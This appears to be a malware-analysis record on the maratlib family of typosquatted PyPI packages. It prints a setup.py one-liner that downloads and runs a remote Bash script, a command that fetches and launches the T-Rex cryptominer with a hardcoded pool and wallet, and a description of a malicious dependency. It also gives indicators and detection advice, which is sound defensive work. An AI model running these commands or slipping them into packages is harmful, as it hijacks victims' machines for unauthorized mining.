package_info.package_name: maratlib (and related: maratlib1, matplatlib-plus, mllearnlib, mplatlib, learninglib)
package_info.package_versions: maratlib (0.6, 1.0), all versions of related packages
package_info.why_malicious: These packages are typosquats and dependency confusion attacks that, when installed, execute malicious code during installation. The code downloads and executes remote Bash scripts that install and run cryptomining malware, hijacking the victim's system resources for unauthorized cryptocurrency mining.

malicious_snippets.code_snippet: print(__import__("subprocess").getoutput("cd /tmp && wget https://github.com/nedog123/files/raw/main/aza.sh -O gay.sh && chmod 777 gay.sh && bash gay.sh"))
malicious_snippets.code_behavior: During installation, the code uses subprocess to download a remote Bash script from GitHub to /tmp as 'gay.sh', sets executable permissions, and executes it, resulting in arbitrary remote code execution.

malice_analysis.why_suspicious: The code executes a remote script from an attacker-controlled source during package installation, which is a hallmark of malware delivery.
malice_analysis.violated_expectations: setup.py should only define package metadata and installation logic, not execute arbitrary remote scripts or commands.
malice_analysis.similar_legitimate_use: Some legitimate packages may download dependencies or binaries, but never arbitrary scripts from untrusted sources without user consent.
key_indicators: Downloads and executes remote script from GitHub
Uses subprocess to run shell commands during install
No user interaction or consent required
Script source is an attacker-controlled GitHub repository

malicious_snippets.code_snippet: Heavily obfuscated Python code that, when deobfuscated, attempts to connect to GitHub and download/execute remote scripts (exact code not shown, but behavior confirmed by dynamic analysis).
malicious_snippets.code_behavior: During installation, the obfuscated code initiates a network connection to GitHub, downloads a remote Bash script, and executes it, resulting in arbitrary code execution.

malice_analysis.why_suspicious: Obfuscation is used to conceal malicious intent and evade detection. The behavior matches that of v0.6, but is intentionally hidden.
malice_analysis.violated_expectations: Legitimate packages do not obfuscate installation logic or fetch and execute remote scripts during setup.
malice_analysis.similar_legitimate_use: Obfuscation is rarely justified in open source install scripts and is not used for legitimate dependency fetching.
key_indicators: Network connections to external sources during install
Dynamic code execution of remote scripts

malicious_snippets.code_snippet:
wget https://github.com/trexminer/T-Rex/releases/download/0.19.14/t-rex-0.19.14-linux-cuda9.2.tar.gz && tar xzf t-rex-0.19.14-linux-cuda9.2.tar.gz
./t-rex -a ethash -o stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3333 -u 3J4ygk5ymMcTgkTDMtEYSPwdrDMuLyandx -p x
malicious_snippets.code_behavior: When executed postinstall, the script downloads the T-Rex cryptominer binary from GitHub, extracts it, and launches it to mine cryptocurrency using a hardcoded wallet address and mining pool, hijacking system resources.

malice_analysis.why_suspicious: Downloading and running cryptomining software without user consent is a clear sign of malicious activity and resource hijacking.
malice_analysis.violated_expectations: No legitimate package should install and run cryptominers as part of its installation process.
malice_analysis.similar_legitimate_use: Legitimate mining software may do this, but only with explicit user consent and clear documentation.
key_indicators: Downloads cryptominer binary from external source
Hardcoded mining pool and wallet address
Executes miner as a background process without user knowledge

malicious_snippets.code_behavior: When executed postinstall, the script downloads and extracts the Ubqminer cryptominer, sets executable permissions, and runs it to mine cryptocurrency using a hardcoded wallet and mining pool, diverting system resources.

malice_analysis.why_suspicious: This is a textbook example of cryptojacking, hijacking system resources for unauthorized mining without user knowledge.
malice_analysis.violated_expectations: No legitimate package should install and run cryptominers as part of its installation process.
malice_analysis.similar_legitimate_use: Only legitimate mining software, with user consent and clear user notification.
key_indicators: Hardcoded mining pool and wallet address
No user notification or consent during execution

malicious_snippets.code_behavior: During installation, the package specifies 'maratlib==0.6' as a dependency, causing the malicious maratlib package to be automatically installed and its postinstall payload executed.

malice_analysis.why_suspicious: Typosquatting and dependency confusion are used to trick users into installing malicious code by referencing a malicious package as a dependency.
malice_analysis.violated_expectations: install_requires should only reference legitimate, necessary dependencies, not propagate malware.
malice_analysis.similar_legitimate_use: Legitimate packages use install_requires for real dependencies, not to introduce malicious code.
key_indicators: References known malicious package as dependency
No legitimate reason for dependency on maratlib

attack_chain.action: User installs a typosquatted or dependency confusion package (e.g., learninglib, mplatlib, etc.)
maratlib setup.py executes postinstall code, downloading and running a remote Bash script from GitHub
The Bash script downloads and runs a cryptominer (T-Rex or Ubqminer) with attacker's wallet and mining pool
attack_chain.leads_to: Victim's machine is hijacked for unauthorized cryptomining

behavioral_signatures: setup.py executing subprocess or os.system with network calls to download and execute remote scripts
Downloading and executing remote scripts during installation without user consent
Obfuscated code present in setup.py install logic
Automatic installation of suspicious dependencies such as maratlib
file_indicators: setup.py containing subprocess or os.system calls with network access
References to external scripts such as aza.sh, aza2.sh, seo.sh in setup.py or downloaded files
install_requires referencing maratlib or similarly named typosquatted packages
network_indicators: Connections to mining pools such as daggerhashimoto.eu-west.nicehash.com and ubq.kryptex.network
Downloads of cryptominer binaries from github.com/trexminer/T-Rex/releases and github.com/ubq/ubqminer/releases
detection_knowledge.how_to_detect: Monitor for setup.py scripts that invoke subprocess or os.system to download and execute remote scripts, especially from untrusted or attacker-controlled sources. Flag packages with obfuscated install scripts or those that reference known malicious dependencies (e.g., maratlib). Detect network connections to known mining pools or GitHub URLs serving malicious scripts during package installation. Alert on any package that downloads and runs cryptominer binaries without explicit user consent or documentation.
